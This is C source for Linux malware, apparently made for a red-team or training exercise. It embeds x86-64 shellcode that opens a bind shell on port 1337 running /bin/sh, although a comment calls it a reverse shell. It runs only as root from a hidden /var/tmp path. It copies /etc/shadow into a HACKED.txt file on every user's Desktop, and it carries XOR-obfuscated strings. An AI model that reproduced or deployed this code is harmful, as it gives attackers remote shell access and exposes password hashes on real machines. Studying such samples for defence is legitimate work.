

// SOURCE_STRINGS
//#define HACKED_XOR "You have been HACKED. Not only have you been HACKED, you will see that I AM ROOT. To prove this I've conveniently included the contents of shadow...\n\n"
//#define SHADOW_XOR "/etc/shadow"
//#define TPS_XOR "/var/tmp/.entry-3tps-93f8u-rprt"
//#define HOME_XOR "/home/"
//#define PROC_XOR "/proc/self/exe"
// END_SOURCE_STRINGS

//START OBFUSCATING
//END OBFUSCATING

#define _GNU_SOURCE
#include <dirent.h>
#include <sys/mman.h> // for mprotect #include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>

#pragma GCC push_options

unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x05\x39\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

char scratch[4096];

#pragma GCC optimize ("O0")
char * dexor(const char * to_dexor) {
    int i;
    int length =  *((int*) to_dexor);
    for (i = 4; i < length+4; i++) {
	// The XOR key is the least significant byte of the string length
        scratch[i-4] = to_dexor[i] ^ *((char*)to_dexor);
    }
    // Tack on null terminator
    scratch[length] = '\0';

    return scratch;
}
#pragma GCC pop_options

/**
 *  Create a file on all user's desktops containing the message and the contents of /etc/shadow.
 */
void create_hacked_file(char * full_path) {
    FILE * fd = fopen(full_path, "w");

    if (fd) {
         char shadow_buf[4096] = {0};

	 FILE * shadow_ptr = fopen(dexor(SHADOW_XOR), "r");
	 int read_count = fread(shadow_buf, 1, 4096, shadow_ptr);
         fclose(shadow_ptr);
	 char * message = dexor(HACKED_XOR);
	 fwrite(message, 1, strlen(message), fd);
	 fwrite(shadow_buf, 1, read_count, fd);
	 fclose(fd);
    }
}

/**
 * Main entry point for our program
 */
int main(int argc, char *argv[]) {


    uid_t curr_id = geteuid();

    if (curr_id != 0) {
        // Exit because we are not root
        exit(0);
    }

    char readbuf[1024] = {0};
    readlink(dexor(PROC_XOR), readbuf, sizeof(readbuf));
    if (strncmp(readbuf, dexor(TPS_XOR), sizeof(readbuf)) != 0) {
        // Exit because we are not executing from intended location.  
	exit(0);
    }

    // Fork off the writer for hacked.txt and the msfvenom reverse shell. 
    if (fork() == 0) {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (!mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),pagesize, PROT_READ|PROT_EXEC)) {

            int (*ret)() = (int(*)())buf;
            ret();
	} 
    } else {
	struct dirent * users_dir;
        DIR *d = opendir("/home/");

	if (d) {
            while ((users_dir = readdir(d)) != NULL) {        
                if (strcmp(users_dir->d_name, ".") == 0 || strcmp(users_dir->d_name, "..") == 0)
                    continue;                
	        char path[256];
	        snprintf(path, sizeof(path), "/home/%s", users_dir->d_name);

		char final_path[256];

		snprintf(final_path, sizeof(final_path), "%s/Desktop/HACKED.txt", path);
                
		create_hacked_file(&final_path);
	    }	    
	}
    }
}
